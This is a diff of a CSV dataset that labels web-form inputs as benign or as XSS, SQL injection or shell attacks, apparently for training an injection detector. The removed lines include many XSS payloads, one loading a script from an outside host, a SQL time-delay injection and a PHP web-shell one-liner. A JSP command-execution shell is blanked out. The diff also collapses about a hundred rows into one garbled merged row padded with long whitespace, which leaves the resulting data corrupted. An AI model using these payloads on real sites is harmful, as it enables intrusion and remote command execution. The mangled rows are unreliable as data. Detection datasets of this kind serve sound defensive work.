@@ -45093,114 +45093,7 @@ index,payload,is_malicious,injection_type
 45092,othella,0.0,LEGAL
 45093,"<img \\x34src=x onerror=""javascript:alert(1)"">",1.0,XSS
 45094,antiquate,0.0,LEGAL
-45095,"&q=as""><script src=""http://www.yourjavascript.com/38310202111/xss.js"">",1.0,XSS
-45096,winnings,0.0,LEGAL
-45097,Guarrate,0.0,LEGAL
-45098,Nagel+Ordo%F1es,0.0,LEGAL
-45099,Albillos,0.0,LEGAL
-45100,injunctions,0.0,LEGAL
-45101,ann-hoon,0.0,LEGAL
-45102,"<IMG STYLE=""xss:expr/*XSS*/ession(alert(\'XSS\'))"">",1.0,XSS
-45103,reliever,0.0,LEGAL
-45104,Annabela,0.0,LEGAL
-45105,ratnam,0.0,LEGAL
-45106,"<a""'%0A`= +%20>;test<a""'%0A`= +%20>?test<a""'%0A`= +%20>;#test<a""'%0A`= +%20>;",1.0,XSS
-45107,group,0.0,LEGAL
-45108,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1.0,XSS
-45109,Salomi,0.0,LEGAL
-45110,traversed,0.0,LEGAL
-45111,carpets,0.0,LEGAL
-45112,ruinous,0.0,LEGAL
-45113,<iframe/i='javascript:alert(1)'onload='URL=i'>,1.0,XSS
-45114,antics,0.0,LEGAL
-45115,<div contextmenu=x>right-click<menu id=x onshow=confirm(1)>,1.0,XSS
-45116,1257768627,0.0,LEGAL
-45117,240700820.1258340597,0.0,LEGAL
-45118,weekly,0.0,LEGAL
-45119,ailene,0.0,LEGAL
-45120,h61%E1ng19a,0.0,LEGAL
-45121,Biscayne,0.0,LEGAL
-45122,32794604P,0.0,LEGAL
-45123,lilley%40intelethernet.ic,0.0,LEGAL
-45124,Oliveras+Dotras,0.0,LEGAL
-45125,46632076J,0.0,LEGAL
-45126,feelingly,0.0,LEGAL
-45127,AGiWqtxfYY0S7NSBcF7fmeRMe5aExCtoRQ,0.0,LEGAL
-45128,Vinko,0.0,LEGAL
-45129,learner,0.0,LEGAL
-45130,amer_dierkes%40ajuntamentdebarcelona20.gm,0.0,LEGAL
-45131,Gwendolen,0.0,LEGAL
-45132,79871622M,0.0,LEGAL
-45133,Sant+Joan+de+Vilatorrada,0.0,LEGAL
-45134,Nilia,0.0,LEGAL
-45135,Bobbie,0.0,LEGAL
-45136,homicide,0.0,LEGAL
-45137,pilar,0.0,LEGAL
-45138,29168,0.0,LEGAL
-45139,centralization,0.0,LEGAL
-45140,i-chao,0.0,LEGAL
-45141,costen,0.0,LEGAL
-45142,Riordan,0.0,LEGAL
-45143,determined,0.0,LEGAL
-45144,<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1.0,XSS
-45145,Melodee,0.0,LEGAL
-45146,socialists,0.0,LEGAL
-45147,%3B1%3B27%3B63%3B65%3B77%3B85%3B89%3B113%3B158%3B197%3B207%3B219%3B244%3B297%3B305%3B427%3B671%3B855%3B876%3B2651%3B2759%3B2801%3B2803%3B3499%3B3525%3B3536%3B3663%3B4770%3B4773%3B4775%3B4777%3B4788%3B4791%3B4794%3B4796%3B4802%3B4,0.0,LEGAL
-45148,wilbert,0.0,LEGAL
-45149,3748ny,0.0,LEGAL
-45150,03897085B,0.0,LEGAL
-45151,consolidate,0.0,LEGAL
-45152,bfilename,1.0,SQL
-45153,Marguerita,0.0,LEGAL
-45154,Martians,0.0,LEGAL
-45155,appraised,0.0,LEGAL
-45156,precio,0.0,LEGAL
-45157,Cassite,0.0,LEGAL
-45158,Loris,0.0,LEGAL
-45159,Pelayo,0.0,LEGAL
-45160,with,0.0,LEGAL
-45161,heals,0.0,LEGAL
-45162,cisalpina,0.0,LEGAL
-45163,5731,0.0,LEGAL
-45164,preconditioned,0.0,LEGAL
-45165,dafydd%40mytanga.nf,0.0,LEGAL
-45166,Agilberto,0.0,LEGAL
-45167,Larkin,0.0,LEGAL
-45168,Cipr%E9s+Boero,0.0,LEGAL
-45169,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1.0,SQL
-45170,Flaviano,0.0,LEGAL
-45171,lions,0.0,LEGAL
-45172,Iroquois,0.0,LEGAL
-45173,Gillespie,0.0,LEGAL
-45174,quadruple,0.0,LEGAL
-45175,"<?php system($_GET[""cmd""]) ?>",1.0,SHELL
-45176,8086,0.0,LEGAL
-45177,tolerability,0.0,LEGAL
-45178,39643208V,0.0,LEGAL
-45179,$.parseHTML('<img src=xx:X onerror=confirm(1)>'),1.0,XSS
-45180,nonexistant1564357067,0.0,LEGAL
-45181,30584367W,0.0,LEGAL
-45182,deluge,0.0,LEGAL
-45183,&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,1.0,XSS
-45184,nurse,0.0,LEGAL
-45185,Carratraca,0.0,LEGAL
-45186,Nuri,0.0,LEGAL
-45187,cults,0.0,LEGAL
-45188,4611888318080805,0.0,LEGAL
-45189,1257769514469,0.0,LEGAL
-45190,entitling,0.0,LEGAL
-45191,Olva,0.0,LEGAL
-45192,2015784744450329,0.0,LEGAL
-45193,Carrer+De+Pujades+134%2C+11-H,0.0,LEGAL
-45194,'><scri\x00pt>alert(1);</scri%00pt>,1.0,XSS
-45195,downfall,0.0,LEGAL
-45196,01594414997816070391,0.0,LEGAL
-45197,bean,0.0,LEGAL
-45198,waltzes,0.0,LEGAL
-45199,Gonzalez%2C+68%2C+5%3FE,0.0,LEGAL
-45200,Shawn,0.0,LEGAL
-45201,Diago+Dard%F3n,0.0,LEGAL
-45202,"<img src=""x` `<script>alert(1)</script>""` `>",1.0,XSS
+45095,"&q=as""><script src=""http://www.yourjavascript.com/38310202111/xss.js"">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             </script>""` `>",1.0,XSS
 45203,classifier,0.0,LEGAL
 45204,leafloor,0.0,LEGAL
 45205,crafter,0.0,LEGAL
@@ -71059,7 +70952,7 @@ index,payload,is_malicious,injection_type
 71059,18339,0.0,LEGAL
 71060,Rudyard,0.0,LEGAL
 71061,18275131615767472188,0.0,LEGAL
-71062,"<% Runtime.getruntime().exec(request.getParameter(""cmd"")) %>",1.0,SHELL
+71062,"<%                                                          %>",1.0,SHELL
 71063,Steve,0.0,LEGAL
 71064,snail,0.0,LEGAL
 71065,Baztan%2C+82%2C+,0.0,LEGAL
